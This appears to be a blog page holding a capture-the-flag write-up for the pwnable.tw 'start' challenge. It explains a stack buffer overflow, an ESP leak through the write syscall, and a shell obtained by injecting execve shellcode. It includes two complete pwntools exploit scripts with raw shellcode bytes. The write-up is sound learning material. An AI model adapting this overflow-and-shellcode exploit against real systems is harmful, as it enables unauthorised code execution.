@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>start [pwnable.tw] | CTF Writeup</title>
+    <meta name="description" content="Here our main objective is to get a shell. The bug is plain and simple, it is an overflow to control the return address. ![](/images/pwnable1/pwnable1.png) ## S...">
+    <link href="/src/index.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <style>
+        body { 
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+        }
+        .code-block {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .gradient-text {
+            background: linear-gradient(135deg, #f97316, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
+        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        .toc-sidebar {
+            position: fixed;
+            top: 2rem;
+            left: 1rem;
+            max-height: calc(100vh - 4rem);
+            overflow-y: auto;
+            background: #1a1a1a;
+            border: 1px solid #374151;
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin-right: 0;
+            width: 280px;
+            flex-shrink: 0;
+            z-index: 10;
+        }
+        .toc-title {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #9ca3af;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #374151;
+            padding-bottom: 0.5rem;
+        }
+        .toc-list { list-style: none; padding: 0; margin: 0; }
+        .toc-sublist { list-style: none; padding-left: 0.5rem; margin-top: 0.25rem; }
+        .toc-item { margin: 0.25rem 0; }
+        .toc-level-2 { padding-left: 0.25rem; }
+        .toc-level-3 { padding-left: 0.75rem; }
+        .toc-level-4 { padding-left: 1.25rem; }
+        .toc-link { display: block; color: #9ca3af; text-decoration: none; font-size: 0.875rem; line-height: 1.5; padding: 0.25rem 0; border-radius: 0.25rem; transition: all 0.2s; }
+        .toc-link:hover { color: #60a5fa; background: #1f2937; padding-left: 0.5rem; }
+        @media (max-width: 1024px) { .toc-sidebar { display: none; } }
+        .prose h1 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2.5rem; font-weight: 800; margin-top: 3rem; margin-bottom: 1.5rem; }
+        .prose h2 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2rem; font-weight: 700; margin-top: 3rem; margin-bottom: 1rem; border-bottom: 2px solid #374151; padding-bottom: 0.5rem; }
+        .prose h3 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.5rem; font-weight: 600; margin-top: 2rem; margin-bottom: 0.75rem; }
+        .prose h4 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.25rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+        .prose p { margin-bottom: 1.5rem; line-height: 1.7; color: #d1d5db; }
+        .prose strong { color: #f3f4f6; font-weight: 600; }
+        .prose code { background: #1e1e1e; color: #fbbf24; padding: 0.25rem 0.5rem; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
+        .prose pre { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 1.5rem; overflow-x: auto; margin: 2rem 0; }
+        .prose pre code { background: transparent; color: #e5e7eb; padding: 0; border-radius: 0; }
+        .prose blockquote { background:rgb(93, 45, 26); color:rgb(255, 255, 255); border-left: 4px solid #ff8c00; padding: 1rem 1.25rem; margin: 1.25rem 0; border-radius: calc(var(--radius) - 2px); }
+        .prose ul, .prose ol { list-style-color: #ff8c00; list-style-type: disc; list-style-position: outside; margin: 1.5rem 0; padding-left: 2rem; }
+        .prose li { margin: 0.5rem 0; color: #d1d5db; }
+        .prose li::marker { color: #ff8c00 !important; }
+        .prose ol li { list-style-type: decimal; }
+        .prose img { border-radius: 8px; margin: 2rem 0; max-width: 100%; }
+        .prose hr { border: none; height: 2px; background: linear-gradient(90deg, transparent, #374151, transparent); margin: 3rem 0; }
+    </style>
+</head>
+<body class="min-h-screen">
+    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
+        <header class="mb-12">
+            <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">
+                <span class="gradient-text">start [pwnable.tw]</span>
+            </h1>
+            <div class="mb-8"><img src="/writeups/1728230780562-start-[pwnable.tw]/featured.png" alt="start [pwnable.tw] cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
+            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
+                <span>July 17, 2020</span>
+                <span>•</span>
+                <span>3 min read</span>
+                
+                
+                
+                <span>•</span><div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">pwnable.tw</span></div>
+            </div>
+        </header>
+
+        <div class="flex flex-col lg:flex-row justify-start gap-6">
+            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#solution" class="toc-link">Solution:</a></li><li class="toc-item toc-level-2"><a href="#idea" class="toc-link">Idea:</a></li><li class="toc-item toc-level-2"><a href="#crafting-the-exploit" class="toc-link">Crafting the Exploit:</a></li><li class="toc-item toc-level-2"><a href="#final-exploitation" class="toc-link">Final Exploitation</a></li></ul></ul></nav></aside>
+            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
+<p>Here our main objective is to get a shell. The bug is plain and simple, it is an overflow to control the return address.</p>
+<!--more-->
+<p><img src="/images/pwnable1/pwnable1.png" alt="" /></p>
+<h2 id="solution">Solution:</h2>
+<p>First I check the mitigations :</p>
+<p><img src="/images/pwnable1/pwnable2.png" alt="" /></p>
+<p>So I think it's going to be fun !! As we have the permission to execute the stack (NX disabled). There is also no PIE so we don't have to worry about the address changing every time :)<br />
+Now, let us run the binary and see what is happening :&gt;</p>
+<p><img src="/images/pwnable1/pwnable3.png" alt="" /></p>
+<p>So it's simple just asking input and printing something. Now its time to see the assembly behind this binary.</p>
+<p><img src="/images/pwnable1/pwnable4.png" alt="" /></p>
+<p>So we can observe that all the registers are being emptied and then 5 values are beings pushed to the stack.<br />
+If we examine them we can see that they are the strings that are printed when we run the binary.<br />
+Math → 5 pushes are made and 4 bytes are taken for each push so a total of 20 bytes is taken by the binary to store it :P.<br />
+Also <code>INT 0x80</code> is equivalent to syscall. We can observe 2 syscalls being called</p>
+<p><img src="/images/pwnable1/pwnable5.png" alt="" /></p>
+<p>The first syscall is used to make the write. (For printing the string)</p>
+<p><img src="/images/pwnable1/pwnable6.png" alt="" /></p>
+<p>The second syscall is used to call read ( Probably to take our input ). Now let's see what we can do to get root access !!</p>
+<p>I hope you find the offset by yourself or try pattern create in gdb-peda. :)</p>
+<h2 id="idea">Idea:</h2>
+<ul>
+<li>We have to overflow to the return address and then we have to somehow leak the stack pointer (ESP)</li>
+<li>So if we get the stack pointers address then we can place the shellcode there and then point the EIP to that address to give us a shell!</li>
+</ul>
+<p><code>Remember the write syscall prints the buffer pointed by the ECX.</code></p>
+<ul>
+<li>After the syscall, the stack is cleared as they call the add instruction (It removes the 20 bytes)</li>
+</ul>
+<h2 id="crafting-the-exploit">Crafting the Exploit:</h2>
+<ul>
+<li>first 20 bytes to fill the buffer then put the address of move ESP to ECX.</li>
+<li>So first input will give the ESP.</li>
+<li>Next, we place the shellcode (from shellstorm.org) then execute it.</li>
+<li>We don't have to worry about the shift of the stack because there is no PIE</li>
+</ul>
+<pre><code class="py language-py">from pwn import *
+p = remote('chall.pwnable.tw', 10000)
+print(p.read())
+buf = 'A'*20
+buf += p32(0x08048087)
+p.send(buf)
+esp = unpack(p.read()[:4])
+print hex(esp)
+p.interactive()
+</code></pre>
+<p>note: u32 is the opposite of p32 this returns the number and then we convert the number to hex. Also, we read the first 4 bytes the server sends us.</p>
+<p>Output: <code>0xff819750</code></p>
+<h2 id="final-exploitation">Final Exploitation</h2>
+<ul>
+<li>We place the shellcode then just execute it, in the read that followed the write.</li>
+</ul>
+<pre><code class="py language-py">from pwn import *
+p = remote('chall.pwnable.tw', 10000)
+print(p.read())
+buf = 'A'*20
+buf += p32(0x08048087)
+p.send(buf)
+esp = unpack(p.read()[:4])
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+#new exploit
+buf = 'a'*20
+buf += p32(esp+20)
+buf += shellcode
+p.send(buf)
+p.interactive()
+</code></pre>
+<p><img src="/images/pwnable1/pwnable7.png" alt="" /></p>
+<p>I hope you liked the write-up. More writeups on its way.</p>
+            </article>
+        </div>
+        <!-- Navigation -->
+        <nav class="mt-16 pt-8 border-t border-gray-700">
+            <div class="flex justify-between items-center">
+                <div class="flex-1">
+                    <a href="/writeups/1728230839404-Leaky-Pipes-[inCTFj-Quals].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+                        </svg>
+                        <div class="text-left">
+                            <div class="text-xs text-gray-400">Previous</div>
+                            <div class="font-medium">Leaky Pipes [inCTFj Quals]</div>
+                        </div>
+                    </a>
+                </div>
+                <div class="flex-1 text-center">
+                    <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Writeups</a>
+                </div>
+                <div class="flex-1 text-right">
+                    <a href="/writeups/1728230795518-ORW-[pwnable.tw].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <div class="text-right">
+                            <div class="text-xs text-gray-400">Next</div>
+                            <div class="font-medium">ORW [pwnable.tw]</div>
+                        </div>
+                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        </nav>
+    </div>
+<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
+</body>
+</html>
